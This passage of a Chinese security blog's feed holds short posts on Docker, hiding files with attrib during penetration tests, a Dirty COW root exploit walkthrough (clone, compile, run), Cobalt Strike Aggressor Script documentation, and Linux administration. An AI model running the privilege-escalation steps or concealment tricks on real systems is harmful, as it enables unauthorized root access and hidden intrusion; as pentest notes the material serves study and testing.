给容器起个名字</p><p><strong>–publish , -p</strong> 端口映射，将宿主机的端口（冒号左边）和容器内的端口（冒号右边）映射</p><p>倒数第二个参数<code>redis:6.0.9-alpine3.12</code>是要执行的镜像，倒数第一个参数<code>redis-server</code>代表要执行的具体指令</p><p>docker run 的更多参数，请参考官方文档</p><h2 id="5-进入运行的容器"><a href="#5-进入运行的容器" class="headerlink" title="5.进入运行的容器"></a><strong>5.进入运行的容器</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -i -t myredis /bin/bash</span><br></pre></td></tr></table></figure><p>倒数第二个参数是容器名（也可以用容器ID），倒数第一个参数是要执行的具体指令</p><p>docker exec 的更多参数，请参考官方文档</p><h2 id="6-停止容器运行"><a href="#6-停止容器运行" class="headerlink" title="6.停止容器运行"></a><strong>6.停止容器运行</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop myredis</span><br></pre></td></tr></table></figure><p>这里也可以使用容器ID，一次停止多个容器，可以在后面用空格分隔</p><h2 id="7-删除容器"><a href="#7-删除容器" class="headerlink" title="7.删除容器"></a>7.删除容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm 容器id或者容器名称</span><br></pre></td></tr></table></figure><h2 id="8-复制文件进出容器"><a href="#8-复制文件进出容器" class="headerlink" title="8.复制文件进出容器"></a>8.复制文件进出容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 28:&#x2F;var&#x2F;flag.txt &#x2F;var&#x2F;flag.txtdocker cp &#x2F;var&#x2F;flag.txt 28:&#x2F;var&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>使用cp命令可以将文件从容器复制到物理机也可以将文件从物理机复制到容器中，其中28为容器id的缩写。容器id不必全写，docker会自动匹配相应的容器。</p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件隐藏的小技巧</title>
      <link href="2021/07/20/%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
      <url>2021/07/20/%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="文件隐藏的小技巧"><a href="#文件隐藏的小技巧" class="headerlink" title="文件隐藏的小技巧"></a>文件隐藏的小技巧</h1><p>为了渗透过程的隐蔽性，我们常常需要将文件进行隐藏处理。下面总结了几条常用的命令，以备不时之需。</p><p>将单个文件变成隐藏的系统文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib &quot;文件名&quot; +s +h</span><br></pre></td></tr></table></figure><p>将当前目录下的所有文件和文件夹都隐藏：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +h +s * &#x2F;s &#x2F;d</span><br></pre></td></tr></table></figure><ul><li><code>attrib</code> 命令用来修改文件的属性</li><li><code>+s</code> 参数将文件设置为系统文件</li><li><code>+h</code> 参数将文件设置为隐藏文件</li><li>/S /D 可以对该目录下所有匹配的文件和文件夹执行属性</li></ul><p>懂一点技术的用户都知道如何显示隐藏文件，但很少会注意到要显示「隐藏受保护的操作系统文件」，而且进行取消勾选「隐藏受保护的操作系统文件」操作时，系统会弹出一个措辞颇为严厉的警告窗口，足以将大部分普通用户吓阻回去。</p><p>还原的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">attrib &quot;文件名&quot; -s -h</span><br><span class="line">attrib -h -s * &#x2F;s &#x2F;d</span><br></pre></td></tr></table></figure><p>整个方法的原理以及过程其实十分简单，说白了就是利用了「文件浏览器」对于系统文件出于安全考虑，默认不显示在「文件浏览器]中的特性而已。就方法本身而言，安全系数并不高，但因为你可以将想要隐藏的文件任意命名，以及放在任意路径之下，导致外人基本没有可能找到其藏身之处，也就谈不上后续的破解了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CMD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>脏牛提权</title>
      <link href="2021/07/14/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"/>
      <url>2021/07/14/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h1><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>Dirty COW漏洞是一种发生在<strong>写时复制</strong>的<strong>竞态条件</strong>漏洞。</p><p>详细分析参考链接</p><p><a href="https://blog.csdn.net/hbhgyu/article/details/106245182">https://blog.csdn.net/hbhgyu/article/details/106245182</a></p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p> Linux kernel 2.x through 4.x before 4.8.3</p><h3 id="验证漏洞是否存在"><a href="#验证漏洞是否存在" class="headerlink" title="验证漏洞是否存在"></a>验证漏洞是否存在</h3><p>使用<code>uname -a</code>命令查看linux内核信息，发现在脏牛漏洞范围内</p><p><img src="%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83.assets/image-20210714091603781-1626225366290.png" alt="image-20210714091603781"></p><h3 id="下载EXP"><a href="#下载EXP" class="headerlink" title="下载EXP"></a>下载EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Pa55w0rd&#x2F;dirtycow.git</span><br></pre></td></tr></table></figure><h3 id="将c文件编译成可执行文件"><a href="#将c文件编译成可执行文件" class="headerlink" title="将c文件编译成可执行文件"></a>将c文件编译成可执行文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure><h3 id="执行-dirty-密码-命令，即可进行提权。"><a href="#执行-dirty-密码-命令，即可进行提权。" class="headerlink" title="执行./dirty 密码 命令，即可进行提权。"></a>执行./dirty 密码 命令，即可进行提权。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dirty 密码</span><br></pre></td></tr></table></figure><p><img src="%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83.assets/image-20210714091439210.png" alt="image-20210714091439210"></p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux手动安装JDK</title>
      <link href="2021/07/14/Linux%E6%89%8B%E5%8A%A8%E5%AE%89%E8%A3%85JDK/"/>
      <url>2021/07/14/Linux%E6%89%8B%E5%8A%A8%E5%AE%89%E8%A3%85JDK/</url>
      
        <content type="html"><![CDATA[<p>当Linux无法出网时，需要手动上传jdk压缩包来安装Java环境</p><p>创建安装目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;java&#x2F;</span><br></pre></td></tr></table></figure><p>将压缩包解压至安装目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf jdk-11.0.11_linux-x64_bin.tar.gz -C &#x2F;usr&#x2F;local&#x2F;java&#x2F;</span><br></pre></td></tr></table></figure><p>打开环境变量文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>在末尾追加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk-11.0.11</span><br><span class="line">export JRE_HOME&#x3D;$&#123;JAVA_HOME&#125;&#x2F;jre</span><br><span class="line">export CLASSPATH&#x3D;.:$&#123;JAVA_HOME&#125;&#x2F;lib:$&#123;JRE_HOME&#125;&#x2F;lib</span><br><span class="line">export PATH&#x3D;$&#123;JAVA_HOME&#125;&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure><p>使环境变量生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>添加软链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk-11.0.11&#x2F;bin&#x2F;java &#x2F;usr&#x2F;bin&#x2F;java</span><br></pre></td></tr></table></figure><p>验证安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><p>完成！</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AGGRESSOR SCRIPT官方文档翻译-3. Data Model</title>
      <link href="2021/07/10/AGGRESSOR-SCRIPT%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-3-Data-Model/"/>
      <url>2021/07/10/AGGRESSOR-SCRIPT%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-3-Data-Model/</url>
      
        <content type="html"><![CDATA[<h1 id="AGGRESSOR-SCRIPT官方文档翻译-3-Data-Model"><a href="#AGGRESSOR-SCRIPT官方文档翻译-3-Data-Model" class="headerlink" title="AGGRESSOR SCRIPT官方文档翻译-3. Data Model"></a>AGGRESSOR SCRIPT官方文档翻译-3. Data Model</h1><p>Cobalt Strike的团队服务器存储您的主机、服务、凭证和其他信息。 它还广播该信息，并使其对所有客户端可用。</p><h2 id="数据-API"><a href="#数据-API" class="headerlink" title="数据 API"></a>数据 API</h2><p>使用 <a href="https://www.cobaltstrike.com/aggressor-script/functions.html#data_query">&amp;data_query</a>功能查询Cobalt Strike的数据模型。该功能可以访问Cobalt Strike客户端维护的所有状态和信息。使用<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#data_keys">&amp;data_keys</a> 来获得你可能查询的不同数据片段的列表。此示例查询Cobalt Strike数据模型中的所有数据，并将其导出到一个文本文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">command export &#123;</span><br><span class="line"># 注册命令</span><br><span class="line">local(&#39;$handle $model $row $entry $index&#39;);</span><br><span class="line"># 声明局部变量</span><br><span class="line">$handle &#x3D; openf(&quot;&gt;export.txt&quot;);</span><br><span class="line"># 打开一个文件句柄</span><br><span class="line">foreach $model (data_keys()) &#123;</span><br><span class="line"># 遍历数据模型</span><br><span class="line">println($handle, &quot;&#x3D;&#x3D; $model &#x3D;&#x3D;&quot;);</span><br><span class="line">println($handle, data_query($model));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">closef($handle);</span><br><span class="line"># 关闭文件句柄</span><br><span class="line">println(&quot;See export.txt for the data.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控制台执行：</p><p><img src="AGGRESSOR-SCRIPT%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-3-Data-Model.assets/image-20210710090308507.png" alt="image-20210710090308507"></p><p>导出的数据：</p><p><img src="AGGRESSOR-SCRIPT%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-3-Data-Model.assets/image-20210710090246700.png" alt="image-20210710090246700"></p><p>Cobalt Strike提供了几个函数，可以更直观地使用数据模型。</p><table><thead><tr><th>模型</th><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>applications</td><td><a href="https://www.cobaltstrike.com/aggressor-script/functions.html#applications">&amp;applications</a></td><td>系统配置信息 [<strong>View -&gt; Applications</strong>]</td></tr><tr><td>archives</td><td><a href="https://www.cobaltstrike.com/aggressor-script/functions.html#archives">&amp;archives</a></td><td>连接事件/活动</td></tr><tr><td>beacons</td><td><a href="https://www.cobaltstrike.com/aggressor-script/functions.html#beacons">&amp;beacons</a></td><td>活动的 beacons</td></tr><tr><td>credentials</td><td><a href="https://www.cobaltstrike.com/aggressor-script/functions.html#credentials">&amp;credentials</a></td><td>用户名、口令等.</td></tr><tr><td>downloads</td><td><a href="https://www.cobaltstrike.com/aggressor-script/functions.html#downloads">&amp;downloads</a></td><td>下载的文件</td></tr><tr><td>keystrokes</td><td><a href="https://www.cobaltstrike.com/aggressor-script/functions.html#keystrokes">&amp;keystrokes</a></td><td>键盘记录</td></tr><tr><td>screenshots</td><td><a href="https://www.cobaltstrike.com/aggressor-script/functions.html#screenshots">&amp;screenshots</a></td><td>截屏</td></tr><tr><td>services</td><td><a href="https://www.cobaltstrike.com/aggressor-script/functions.html#services">&amp;services</a></td><td>服务和服务信息</td></tr><tr><td>sites</td><td><a href="https://www.cobaltstrike.com/aggressor-script/functions.html#sites">&amp;sites</a></td><td>资产信息</td></tr><tr><td>socks</td><td><a href="https://www.cobaltstrike.com/aggressor-script/functions.html#pivots">&amp;pivots</a></td><td>SOCKS代理服务器和端口转发</td></tr><tr><td>targets</td><td><a href="https://www.cobaltstrike.com/aggressor-script/functions.html#targets">&amp;targets</a></td><td>主机和主机信息</td></tr></tbody></table><p>这些函数在数据模型中为每个条目返回一个一行的数组。 每个条目是一个具有描述条目的不同键/值对的字典。</p><p>理解数据模型的最佳方法是通过Aggressor Script 控制台来研究它。进入View -&gt; Script Console并使用x命令计算表达式。例如：</p><p><img src="AGGRESSOR-SCRIPT%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-3-Data-Model.assets/data.png" alt="Querying Data from the Aggressor Script console"></p><p>从Aggressor Script 控制台查询数据</p><p>使用 on DATA_KEY 订阅对特定数据模型的更改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">on keystrokes &#123;</span><br><span class="line">println(&quot;I have new keystrokes: $1&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Cobalt Strike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobalt Strike插件开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aggressor Script官方文档翻译-2.Cobalt Strike</title>
      <link href="2021/07/09/Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike/"/>
      <url>2021/07/09/Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="Aggressor-Script官方文档翻译-2-Cobalt-Strike"><a href="#Aggressor-Script官方文档翻译-2-Cobalt-Strike" class="headerlink" title="Aggressor Script官方文档翻译-2.Cobalt Strike"></a>Aggressor Script官方文档翻译-2.Cobalt Strike</h1><h2 id="Cobalt-Strike-客户端"><a href="#Cobalt-Strike-客户端" class="headerlink" title="Cobalt Strike 客户端"></a>Cobalt Strike 客户端</h2><p>Aggressor 脚本引擎是Cobalt Strike的集成特性(the glue feature). 大多数Cobalt Strike对话框和特性都是作为向Aggressor 脚本引擎公开某些接口的独立模块编写的。</p><p>Cobalt Strike中内置了一个默认的脚本, <a href="https://www.cobaltstrike.com/aggressor-script/default.cna">default.cna</a>, 这个脚本定义了Cobalt Strike的工具栏按钮，弹出式菜单，它还为大多数Cobalt Strike事件格式化输出。</p><p>本章将向您展示这些功能如何工作，并使您能够按照您的需求来塑造Cobalt Strike客户端。</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/defaultscript.png" alt="The default.cna script"></p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>脚本可以创建快捷键，使用bind关键字绑定快捷键。这个例子展示了当Ctrl和H同时按下时，在对话框中显示“**Hello World!**”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bind Ctrl+H &#123;</span><br><span class="line">show_message(&quot;Hello World!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709154617398.png" alt="image-20210709154617398"></p><p>快捷键可以是任何ASCII字符或特殊键。快捷键可以有一个或多个修饰符应用于它们，例如:Ctrl, Shift, Alt，或Meta。脚本可以指定修饰符+键。</p><h2 id="弹出式菜单"><a href="#弹出式菜单" class="headerlink" title="弹出式菜单"></a>弹出式菜单</h2><p>脚本也可以添加到Cobalt Strike的菜单结构或重新定义它。popup关键字为popup钩子构建菜单层次。</p><p>下面是定义Cobalt Strike帮助菜单的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">popup help &#123;</span><br><span class="line">        item(&quot;&amp;Homepage&quot;, &#123; url_open(&quot;https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;&quot;); &#125;);</span><br><span class="line">        item(&quot;&amp;Support&quot;,  &#123; url_open(&quot;https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;support&quot;); &#125;);</span><br><span class="line">        item(&quot;&amp;Arsenal&quot;,  &#123; url_open(&quot;https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;scripts&quot;); &#125;);</span><br><span class="line">        separator();    # 分隔线</span><br><span class="line">        item(&quot;&amp;System Information&quot;, &#123; openSystemInformationDialog(); &#125;);</span><br><span class="line">        separator();</span><br><span class="line">        item(&quot;&amp;About&quot;, &#123; openAboutDialog(); &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709155141293-1625817106180.png" alt="image-20210709155141293"></p><p>该脚本与Help popup钩子挂钩，并定义了几个菜单项。菜单项名称中的&amp;是它的快捷键（keyboard accelerator）。当用户单击每个项时，与它相关联的代码块将执行。</p><p>脚本也可以定义带有子元素的菜单。关键字menu定义了一个新菜单。当用户将鼠标悬停在菜单上时，将执行与它相关的代码块，并用于构建子菜单。</p><p>这是Pivot Graph（拓扑图）菜单的一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">popup pgraph &#123;</span><br><span class="line">       menu &quot;&amp;Layout&quot; &#123;</span><br><span class="line">item &quot;&amp;Circle&quot;    &#123; graph_layout($1, &quot;circle&quot;); &#125;</span><br><span class="line">item &quot;&amp;Stack&quot;     &#123; graph_layout($1, &quot;stack&quot;); &#125;</span><br><span class="line">menu &quot;&amp;Tree&quot; &#123;</span><br><span class="line">item &quot;&amp;Bottom&quot; &#123; graph_layout($1, &quot;tree-bottom&quot;); &#125;</span><br><span class="line">item &quot;&amp;Left&quot;   &#123; graph_layout($1, &quot;tree-left&quot;); &#125;</span><br><span class="line">item &quot;&amp;Right&quot;  &#123; graph_layout($1, &quot;tree-right&quot;); &#125;</span><br><span class="line">item &quot;&amp;Top&quot;    &#123; graph_layout($1, &quot;tree-top&quot;); &#125;</span><br><span class="line">&#125;</span><br><span class="line">separator();</span><br><span class="line">item &quot;&amp;None&quot; &#123; graph_layout($1, &quot;none&quot;); &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709155958173.png" alt="image-20210709155958173"></p><p>如果您的脚本为Cobalt Strike菜单钩子指定了一个菜单层次结构，它将添加到已经存在的菜单中。您也可以使用&amp;popup清除功能来清除其他注册菜单项，并重新定义一个符合您个人品位的菜单层次结构。</p><h2 id="自定义输出"><a href="#自定义输出" class="headerlink" title="自定义输出"></a>自定义输出</h2><p>Aggressor脚本中的set关键字定义了如何格式化事件并将其输出显示给用户。下面是set关键字的示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set EVENT_SBAR_LEFT &#123;</span><br><span class="line">return &quot;[&quot; . tstamp(ticks()) . &quot;] &quot; . mynick();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set EVENT_SBAR_RIGHT &#123;</span><br><span class="line">return &quot;[lag: $1 $+ ]&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显示效果：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709161631047.png" alt="image-20210709161631047"></p><p>上面的代码定义了Cobalt Strike事件日志中状态栏的内容 (<strong>View -&gt; Event Log</strong>)。状态栏的左侧显示当前时间和昵称。右边显示Cobalt Strike客户端和团队服务器之间消息的往返时间。</p><p>您可以创建自己的文件来覆盖Cobalt Strike默认脚本中的任何设置选项，其中包含您所关心的事件的定义。把脚本加载进Cobalt Strike后Cobalt Strike将使用您的定义来构建。</p><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>使用on关键字来定义事件的处理程序。当Cobalt Strike连接到团队服务器并准备好时，ready事件就会触发。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">on ready &#123;</span><br><span class="line">show_message(&quot;Ready for action!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显示效果：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709162022551-1625818825432.png" alt="image-20210709162022551"></p><p>Cobalt Strike为各种情况生成事件。使用*元事件查看Cobalt Strike的所有事件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">on * &#123;</span><br><span class="line">local(&#39;$handle $event $args&#39;);</span><br><span class="line"></span><br><span class="line">$event &#x3D; shift(@_);</span><br><span class="line">$args  &#x3D; join(&quot; &quot;, @_);</span><br><span class="line"></span><br><span class="line">$handle &#x3D; openf(&quot;&gt;&gt;eventspy.txt&quot;);</span><br><span class="line">writeb($handle, &quot;[ $+ $event $+ ] $args&quot;);</span><br><span class="line">closef($handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="Aggressor-Script%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91-2-Cobalt-Strike.assets/image-20210709162801522.png" alt="image-20210709162801522"></p><p>生成了事件日志。</p>]]></content>
      
      
      <categories>
          
          <category> Cobalt Strike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobalt Strike插件开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jar包反编译和重打包</title>
      <link href="2021/06/21/Jar%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91%E5%92%8C%E9%87%8D%E6%89%93%E5%8C%85/"/>
      <url>2021/06/21/Jar%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91%E5%92%8C%E9%87%8D%E6%89%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="Jar反编译和重打包"><a href="#Jar反编译和重打包" class="headerlink" title="Jar反编译和重打包"></a>Jar反编译和重打包</h1><p><strong>使用jadx反编译</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jadx -d win win.jar</span><br></pre></td></tr></table></figure><p><strong>使用javac编译工程</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -encoding utf8 -cp classes -d classes .&#x2F;src&#x2F;com&#x2F;jlcss&#x2F;ep&#x2F;*.java -classpath .&#x2F;lib&#x2F;swt.jar</span><br></pre></td></tr></table></figure><p><strong>重新打包</strong></p><p>将jar解压，替换classes后重新打包成zip文件，最后将后缀改成jar即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> 反编译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu执行service iptables -save报错iptables：unrecognized service 的解决方法</title>
      <link href="2021/05/11/Ubuntu%E6%89%A7%E8%A1%8Cservice-iptables-save%E6%8A%A5%E9%94%99iptables%EF%BC%9Aunrecognized-service-%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>2021/05/11/Ubuntu%E6%89%A7%E8%A1%8Cservice-iptables-save%E6%8A%A5%E9%94%99iptables%EF%BC%9Aunrecognized-service-%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>问题描述：</p><p><img src="Ubuntu%E6%89%A7%E8%A1%8Cservice-iptables-save%E6%8A%A5%E9%94%99iptables%EF%BC%9Aunrecognized-service-%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.assets/image-20210511171538464-1620724541793.png" alt="image-20210511171538464"></p><p>解决办法：</p><p>因为Ubuntu默认使用的防火墙并不是iptables，所以使用iptables之前需要先禁用UFW。</p><p>命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure><p>类似地，在CentOS 7服务器的情况下，防火墙也可能是冲突的一个原因。FirewallD默认包含在CentOS 7中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables save</span><br></pre></td></tr></table></figure><p>有时，在Ubuntu服务器中执行以下命令会返回一个无法识别的服务消息。</p><p>该命令基于/etc/init.d文件夹中iptables的启动脚本起作用。 通常，此命令适用于RHEL / Red Hat / CentOS。 在Ubuntu中，要保存防火墙规则的更改，我们使用以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;sbin&#x2F;iptables-save</span><br></pre></td></tr></table></figure><p>但是，如果坚持使用与以前相同的命令，我们可以在/etc/init.d文件夹中添加自定义的可执行启动脚本。 这样可以有效地解决错误。</p>]]></content>
      
      
      <categories>
          
          <category> iptables </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动</title>
      <link href="2021/04/20/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>2021/04/20/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
